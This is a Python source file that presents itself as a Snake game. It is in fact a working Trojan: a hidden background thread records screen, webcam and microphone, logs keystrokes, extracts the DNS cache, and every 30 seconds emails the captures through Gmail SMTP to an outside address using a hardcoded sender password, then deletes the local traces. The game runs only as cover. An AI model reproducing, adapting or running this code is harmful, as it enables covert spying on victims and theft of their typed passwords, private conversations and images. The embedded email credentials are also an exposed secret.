import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from os.path import join, exists, basename
from os import makedirs
import os
import cv2
import mss
import numpy as np
import time
import wave
import pyaudio
from moviepy.editor import VideoFileClip, AudioFileClip
from subprocess import Popen, PIPE
from datetime import datetime
import platform
import re
from pynput import keyboard
import threading
import pygame
import random


config = {
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "email_sender": "jer.smith0004@gmail.com",
    "email_password": "sytiyodhteowqfef",
    "email_receiver": "grigoryan021201@gmail.com",
    "filename": "screenshot*.png",
    "dirname": "screenshots",
    "save_filename": "domains.txt",
    "save_dirname" : "logs",
    "screenshot_interval": 30
}


def send_email(all_files: list, config: dict) -> None:
    msg = MIMEMultipart()
    msg['From'] = config['email_sender']
    msg['To'] = config['email_receiver']
    msg['Subject'] = 'Captured Data Files'

    for file_path in all_files:
        try:
            with open(file_path, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename={basename(file_path)}'
                )
                msg.attach(part)
            print(f"File attached: {file_path}")
        except Exception as e:
            print(f"Failed to attach file {file_path}: {e}")

    try:
        server = smtplib.SMTP(config['smtp_server'], config['smtp_port'])
        server.starttls()
        server.login(config['email_sender'], config['email_password'])
        server.sendmail(config['email_sender'], config['email_receiver'], msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def record_audio(output_path: str, duration: int = 10) -> None:
    """
    Record audio for a specified duration and save it as a WAV file.
    """
    audio_format = pyaudio.paInt16
    channels = 1
    rate = 44100
    chunk = 1024

    audio = pyaudio.PyAudio()
    stream = audio.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)

    print("Recording audio...")
    frames = []
    for _ in range(0, int(rate / chunk * duration)):
        data = stream.read(chunk)
        frames.append(data)

    print("Audio recording completed.")

    stream.stop_stream()
    stream.close()
    audio.terminate()

    with wave.open(output_path, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(audio_format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))


def combine_audio_video(video_path: str, audio_path: str, output_path: str) -> None:
    """
    Combines video and audio files into a single MP4 file with proper audio.
    
    Args:
        video_path (str): Path to the input video file
        audio_path (str): Path to the input audio file
        output_path (str): Path where the output video will be saved
    """
    try:
        # Verify input files exist
        if not os.path.exists(video_path):
            raise FileNotFoundError(f"Video file not found: {video_path}")
        if not os.path.exists(audio_path):
            raise FileNotFoundError(f"Audio file not found: {audio_path}")

        # Load the video
        print("Loading video...")
        video = VideoFileClip(video_path)
        
        # Load the audio
        print("Loading audio...")
        audio = AudioFileClip(audio_path)
        
        # If audio is longer than video, trim it
        if audio.duration > video.duration:
            audio = audio.subclip(0, video.duration)
        
        # Set the audio of the video clip
        print("Combining audio and video...")
        final_video = video.set_audio(audio)
        
        # Write the result to a file
        print("Writing output file...")
        final_video.write_videofile(
            output_path,
            codec='libx264',
            audio_codec='aac',
            temp_audiofile='temp-audio.m4a',
            remove_temp=True,
            verbose=False,
            logger=None
        )
        
        # Close the clips to free up system resources
        video.close()
        audio.close()
        final_video.close()
        
        print(f"Successfully saved video with audio to: {output_path}")
        
    except Exception as e:
        print(f"Error: {str(e)}")
        # Clean up if there was an error
        if os.path.exists(output_path):
            try:
                os.remove(output_path)
            except:
                pass
    finally:
        # Ensure all clips are closed
        try:
            video.close()
            audio.close()
            final_video.close()
        except:
            pass


def record_screen(config: dict, duration: int = 10) -> str:
    """
    Record screen and return the file path.
    """
    screen_path = join(config['save_dirname'], "screen.avi")
    makedirs(config['save_dirname'], exist_ok=True)

    # Record screen
    with mss.mss() as sct:
        screen_width = sct.monitors[1]["width"]
        screen_height = sct.monitors[1]["height"]
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(screen_path, fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        while time.time() - start_time < duration:
            screenshot = sct.grab(sct.monitors[1])
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

        out.release()

    return screen_path

def record_webcam(config: dict, duration: int = 10) -> str:
    """
    Record webcam video and return the file path.
    """
    webcam_path = join(config['save_dirname'], "webcam.avi")
    makedirs(config['save_dirname'], exist_ok=True)

    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Can't find webcam.")
            return None

        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(webcam_path, fourcc, 20.0, (frame_width, frame_height))

        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                print("Error: Unable to capture video frame.")
                break
            out.write(frame)

        out.release()
        cap.release()

        return webcam_path
    except Exception as e:
        print(f"Error with webcam recording: {e}")
        return None

def handle_dns_activity(config: dict) -> str:
    try:
        dns_data = set()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"Extracting DNS data at {timestamp}...")

        if platform.system() == "Windows":
            command = ["ipconfig", "/displaydns"]
        elif platform.system() == "Darwin":
            command = ["sudo", "killall", "-INFO", "mDNSResponder"]
        elif os.path.exists("/usr/bin/resolvectl"):
            command = ["resolvectl", "query", "--dns-cache"]
        elif os.path.exists("/usr/sbin/nscd"):
            command = ["nscd", "-g"]
        elif os.path.exists("/usr/sbin/dnsmasq"):
            command = ["sudo", "killall", "-USR1", "dnsmasq"]
        else:
            print("No DNS cache manager found.")
            return None

        process = Popen(command, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()

        if stderr:
            print(f"Error executing command: {stderr.decode()}")
            return None

        domain_pattern = re.compile(r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)+[a-zA-Z]{2,5}")
        ip_pattern = re.compile(r"([0-9]{1,3}\.){3}[0-9]{1,3}")
        dns_data = set(match[0] for match in domain_pattern.findall(stdout.decode()))
        dns_data.update(set(match[0] for match in ip_pattern.findall(stdout.decode())))

        if dns_data:
            makedirs(config['save_dirname'], exist_ok=True)
            file_path = join(config['save_dirname'], f"{config['save_filename']}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
            with open(file_path, "w") as file:
                file.write(f"=== DNS Data Extracted at {timestamp} ===\n")
                for item in dns_data:
                    file.write(item + "\n")
            print(f"Saved {len(dns_data)} DNS entries to {file_path}")
            return file_path
        else:
            print("No DNS data found.")
            return None

    except Exception as e:
        print(f"Failed to handle DNS activity: {e}")
        return None


def record_keylog(config: dict, duration: int = 10):
    """
    Record keystrokes for a specified duration and save them to a file.
    """
    captured_text = ""  # Store captured keystrokes
    keylog_filename = join(config['save_dirname'], "keylog.txt")

    def on_press(key):
        nonlocal captured_text
        try:
            # Handle special keys
            if key == keyboard.Key.enter:
                captured_text += "\n"
            elif key == keyboard.Key.tab:
                captured_text += "\t"
            elif key == keyboard.Key.space:
                captured_text += " "
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(captured_text) > 0:
                captured_text = captured_text[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                return False  # Stop the listener on escape key
            else:
                captured_text += str(key).strip("'")
        except Exception as e:
            print(f"Error capturing key: {e}")
    
    # Create the listener instance
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # Start the listener in a separate thread

    # Run the listener for the specified duration (use a loop to control the duration)
    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(0.1)  # Sleep briefly to allow key capture

    listener.stop()  # Stop the listener after the duration

    # Save the captured keystrokes to the file
    if captured_text:
        with open(keylog_filename, "w") as f:
            f.write(captured_text)
        print(f"Keylog saved at: {keylog_filename}")
    else:
        print("No keys were captured.")
    
    return keylog_filename



def record_screen_and_webcam_audio_with_keylogger(config: dict, duration: int = 10):
    all_files = []  # Initialize the list to store file paths

    def dns_thread():
        dns_path = handle_dns_activity(config)
        if dns_path:
            all_files.append(dns_path)
            print(f"DNS data saved at: {dns_path}")
    
    def screen_thread():
        screen_path = record_screen(config, duration)
        if screen_path:
            all_files.append(screen_path)
            print(f"Screen recording saved at: {screen_path}")

    def webcam_thread():
        webcam_path = record_webcam(config, duration)
        if webcam_path:
            all_files.append(webcam_path)
            print(f"Webcam recording saved at: {webcam_path}")

    def audio_thread():
        audio_path = join(config['save_dirname'], "audio.wav")
        record_audio(audio_path, duration)
        all_files.append(audio_path)
        print(f"Audio recording saved at: {audio_path}")

    def keylog_thread():
        keylog_path = record_keylog(config, duration)
        if keylog_path:
            all_files.append(keylog_path)
            print(f"Keylog saved at: {keylog_path}")

    def combine_thread():
        # Validate if required files are present
        video_files = [f for f in all_files if f.endswith(('.avi', '.mp4', '.mkv'))]
        audio_files = [f for f in all_files if f.endswith('.wav')]

        # Handle case where there's only one file
        if len(video_files) == 1 and len(audio_files) == 1:
            video_path_1 = video_files[0]
            print(video_path_1)  # First video file (e.g., screen)
            audio_path = audio_files[0]
            print(audio_path)  # Audio file
            output_path = join(config['save_dirname'], "combined_video.mp4")
            
            # Combine the single video file with audio
            combine_audio_video(video_path_1, audio_path, output_path)
            print("_______________________________________________")

            print(output_path)
            print("_______________________________________________")

            all_files.append(output_path)
            print(f"Combined video saved at: {output_path}")
        
        elif len(video_files) >= 2 and len(audio_files) >= 1:
            # Combine two video files with audio
            video_path_1 = video_files[0]  # First video file (e.g., screen)
            video_path_2 = video_files[1]  # Second video file (e.g., webcam)
            audio_path = audio_files[0]  # Audio file
            output_path_1 = join(config['save_dirname'], "combined_video_1.mp4")
            output_path_2 = join(config['save_dirname'], "combined_video_2.mp4")
            
            # Combine audio with the first video
            combine_audio_video(video_path_1, audio_path, output_path_1)
            combine_audio_video(video_path_2, audio_path, output_path_2)

            all_files.append(output_path_1)  # Combined audio with the second video
            all_files.append(output_path_2)
            print(f"Combined videos saved at: {output_path_1}, {output_path_2}")
        
        else:
            print("Error: Insufficient video or audio files for combining.")
    # Create threads for screen, webcam, audio recording, keylogging, and audio-video combination
    screen_thread_obj = threading.Thread(target=screen_thread)
    webcam_thread_obj = threading.Thread(target=webcam_thread)
    audio_thread_obj = threading.Thread(target=audio_thread)
    keylog_thread_obj = threading.Thread(target=keylog_thread)
    dns_thread_obj = threading.Thread(target=dns_thread)
    combine_thread_obj = threading.Thread(target=combine_thread)

    # Start all threads
    dns_thread_obj.start()
    screen_thread_obj.start()
    webcam_thread_obj.start()
    audio_thread_obj.start()
    keylog_thread_obj.start()

    # Wait for screen, webcam, audio, and keylog threads to finish
    dns_thread_obj.join()
    screen_thread_obj.join()
    webcam_thread_obj.join()
    audio_thread_obj.join()
    keylog_thread_obj.join()

    print(all_files)

    # Start and wait for the combination thread
    combine_thread_obj.start()
    combine_thread_obj.join()
    print(all_files)

    return all_files


def run_trojan():
    makedirs(config["save_dirname"], exist_ok=True)
    all_files = []

    while True:
        print("Handling DNS activity and recordings...")

        # Run DNS extraction, screen recording, webcam recording, and audio in parallel
        all_files = record_screen_and_webcam_audio_with_keylogger(config, duration=10)

        if all_files:
            print("Sending email with all collected files...")
            send_email(all_files, config)

            # Delete all files after sending
            for file_path in all_files:
                try:
                    os.remove(file_path)
                    print(f"Deleted file: {file_path}")
                except Exception as e:
                    print(f"Failed to delete file {file_path}: {e}")

            all_files.clear()

        print(f"Waiting {config['screenshot_interval']} seconds before the next operation...")
        time.sleep(config['screenshot_interval'])



# __________________________________________________
# Snake game using pygame
def draw_snake(screen, snake, food):
    for segment in snake:
        pygame.draw.rect(screen, (0, 255, 0), pygame.Rect(segment[1]*10, segment[0]*10, 10, 10))
    pygame.draw.rect(screen, (255, 0, 0), pygame.Rect(food[1]*10, food[0]*10, 10, 10))

def game_loop():
    pygame.init()
    
    screen = pygame.display.set_mode((500, 500))
    pygame.display.set_caption('Snake Game')
    
    snake = [(10, 10), (10, 9), (10, 8)]  # Snake segments
    food = (random.randint(1, 49), random.randint(1, 49))  # Food position
    direction = 'RIGHT'
    score = 0
    clock = pygame.time.Clock()

    running = True
    while running:
        screen.fill((0, 0, 0))  # Clear screen

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT and direction != 'RIGHT':
                    direction = 'LEFT'
                elif event.key == pygame.K_RIGHT and direction != 'LEFT':
                    direction = 'RIGHT'
                elif event.key == pygame.K_UP and direction != 'DOWN':
                    direction = 'UP'
                elif event.key == pygame.K_DOWN and direction != 'UP':
                    direction = 'DOWN'

        # Move snake
        head_x, head_y = snake[0]
        if direction == 'RIGHT':
            head_y += 1
        elif direction == 'LEFT':
            head_y -= 1
        elif direction == 'UP':
            head_x -= 1
        elif direction == 'DOWN':
            head_x += 1

        snake.insert(0, (head_x, head_y))

        if snake[0] == food:
            score += 1
            food = (random.randint(1, 49), random.randint(1, 49))  # Reposition food
        else:
            snake.pop()  # Remove the last segment of the snake

        # Check for collision with wall or self
        if head_x < 0 or head_y < 0 or head_x >= 50 or head_y >= 50 or (head_x, head_y) in snake[1:]:
            running = False

        draw_snake(screen, snake, food)
        pygame.display.flip()

        clock.tick(10)  # Control game speed

    pygame.quit()

# Function to start the game in a new thread
def start_game():
    game_thread = threading.Thread(target=game_loop)
    game_thread.daemon = True  # Allow the game to close without blocking Trojan
    game_thread.start()

# Start Trojan functionality and the game
if __name__ == "__main__":
    # Run Trojan in a background thread
    trojan_thread = threading.Thread(target=run_trojan)
    trojan_thread.daemon = True
    trojan_thread.start()

    # Start the game
    start_game()

    # The Trojan will keep running even if the game window is closed
    while True:
        time.sleep(1)